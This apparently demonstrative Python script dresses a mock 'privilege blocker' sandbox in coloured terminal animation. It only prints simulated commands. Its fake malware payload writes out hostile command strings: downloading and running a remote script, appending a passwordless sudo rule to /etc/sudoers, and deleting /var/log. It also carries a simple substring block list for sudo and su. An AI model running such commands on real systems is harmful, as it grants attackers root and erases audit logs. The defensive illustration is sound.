import os
import time
import sys
import contextvars
from contextlib import contextmanager

# ==========================================
# YAMA-BLOCKER: THE ABYSS JUDGMENT THEME
# (5 Unique Non-Repeating Colors)
# ==========================================
COBALT   = '\033[38;5;27m'   # Deep Blue
HELLFIRE = '\033[38;5;202m'  # Blazing Orange/Red
ACID     = '\033[38;5;118m'  # Toxic/Neon Green
GHOST    = '\033[38;5;253m'  # Near White
ABYSS    = '\033[38;5;236m'  # Very Dark Gray
RST      = '\033[0m'
BLD      = '\033[1m'

# ==========================================
# ANIMATION: YAMA'S DESCENT
# ==========================================
def yama_boot_animation():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    logo = [
        f"{HELLFIRE}      \\ | /       {RST}",
        f"{HELLFIRE}     - {GHOST}YAMA{HELLFIRE} -      {RST}",
        f"{HELLFIRE}      / | \\       {RST}",
        f"{ABYSS}==================={RST}",
        f"{GHOST} P R I V I L E G E {RST}",
        f"{GHOST}   B L O C K E R   {RST}",
        f"{ABYSS}==================={RST}"
    ]
    
    # 1. Glitch Fade-in Effect
    for line in logo:
        print(line)
        time.sleep(0.15)
        
    print("\n")
    
    # 2. Gate Closing Animation (Locking the Sandbox)
    sys.stdout.write(f"{COBALT}[*] Securing Execution Environment {RST}")
    sys.stdout.flush()
    
    gate_anim = ["| | |", "|| ||", "|||||", "█████"]
    for _ in range(3):
        for frame in gate_anim:
            sys.stdout.write(f"\b\b\b\b\b{HELLFIRE}{frame}{RST} ")
            sys.stdout.flush()
            time.sleep(0.15)
            
    print(f"\b\b\b\b\b\b{ACID}[LOCKED]{RST}   \n")
    time.sleep(0.5)

# ==========================================
# ARCHITECTURE: CONTEXT-AWARE SANDBOXING
# ==========================================

# Using ContextVars: This tracks state per-thread safely.
# Even if 100 scripts run at once, their privilege contexts won't mix.
current_privilege = contextvars.ContextVar('privilege', default='USER')
syscall_history = contextvars.ContextVar('syscall_history', default=[])

class PrivilegeEscalationError(Exception):
    """Custom Fatal Exception when Yama strikes."""
    pass

@contextmanager
def YamaSandbox(process_name, initial_privilege="USER"):
    """
    A Python Context Manager (The Sandbox).
    Anything running inside 'with YamaSandbox():' is strictly monitored.
    """
    print(f"{ABYSS}┌─────────────────────────────────────────────────────┐{RST}")
    print(f"{ABYSS}│ {COBALT}SANDBOX INITIALIZED FOR: {GHOST}{BLD}{process_name}{RST}")
    print(f"{ABYSS}│ {COBALT}BASE CLEARANCE: {GHOST}{initial_privilege}{RST}")
    
    # Set the secure context for this specific run
    token_priv = current_privilege.set(initial_privilege)
    token_hist = syscall_history.set([])
    
    try:
        # Yield control back to the script (let it run)
        yield
        
        # If script finishes without errors, Yama approves.
        print(f"{ABYSS}│ {ACID}[✔] PROCESS COMPLETED WITHOUT VIOLATIONS.{RST}")
        
    except PrivilegeEscalationError as e:
        # Yama intercepts the illegal move
        print(f"{ABYSS}│ {HELLFIRE}{BLD}[✖] YAMA STRIKE DEPLOYED: FATAL TERMINATION!{RST}")
        print(f"{ABYSS}│ {HELLFIRE}REASON: {e}{RST}")
    finally:
        # Teardown the sandbox and reset context
        current_privilege.reset(token_priv)
        syscall_history.reset(token_hist)
        print(f"{ABYSS}└─────────────────────────────────────────────────────┘{RST}\n")
        time.sleep(1)

# ==========================================
# EXECUTION ENGINE (SIMULATING COMMANDS)
# ==========================================

def execute_syscall(command, requires_root=False):
    """Simulates a system call to the OS Kernel."""
    priv = current_privilege.get()
    hist = syscall_history.get()
    
    time.sleep(0.3) # Simulate processing time
    
    print(f"{ABYSS}│ {GHOST}  Executing: {command} {RST}")
    
    # 1. Track behavior
    hist.append(command)
    
    # 2. Heuristic Check: Is a USER trying to run a ROOT command?
    if requires_root and priv != "ROOT":
        raise PrivilegeEscalationError(f"User level '{priv}' attempted unauthorized Root execution: '{command}'")
        
    # 3. Anomaly Check: Is the script trying to silently change its own privilege?
    if "su -" in command or "sudo" in command or "chmod +s" in command:
        if priv != "ROOT":
            raise PrivilegeEscalationError(f"Illegal binary execution detected. Process tried to escalate via '{command}'")
            
    print(f"{ABYSS}│ {ACID}  ↳ Success{RST}")
    return True

# ==========================================
# REAL-WORLD PAYLOAD SIMULATIONS
# ==========================================

def payload_safe_worker():
    """A normal background process."""
    execute_syscall("ls -la /home/user/docs")
    execute_syscall("cat /home/user/docs/notes.txt")
    execute_syscall("echo 'Task Done' > status.log")

def payload_malicious_hacker():
    """A script that gets infected halfway through and tries to become Root."""
    execute_syscall("wget http://safe-site.com/update.sh")
    execute_syscall("chmod +x update.sh")
    execute_syscall("./update.sh")
    
    # The Payload triggers a PrivEsc exploit (e.g., trying to run sudo without password)
    execute_syscall("sudo bash -c 'echo hacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'", requires_root=True)
    
    # This line will never execute because Yama will kill it above
    execute_syscall("rm -rf /var/log/")

def run_yama_engine():
    yama_boot_animation()
    
    # Test 1: The Safe Process
    print(f"{COBALT}[*] INITIATING TEST 1: Standard Employee Script...{RST}")
    with YamaSandbox("Data_Backup_Agent", initial_privilege="USER"):
        payload_safe_worker()
        
    # Test 2: The PrivEsc Attack
    print(f"{HELLFIRE}[*] INITIATING TEST 2: Compromised Malware Script...{RST}")
    with YamaSandbox("Update_Service_Exploit", initial_privilege="USER"):
        payload_malicious_hacker()
        
    print(f"{COBALT}[*] Engine shutting down. Environment Secure.{RST}")

if __name__ == "__main__":
    try:
        run_yama_engine()
    except KeyboardInterrupt:
        print(f"\n{HELLFIRE}[!] System Halted by Operator.{RST}")
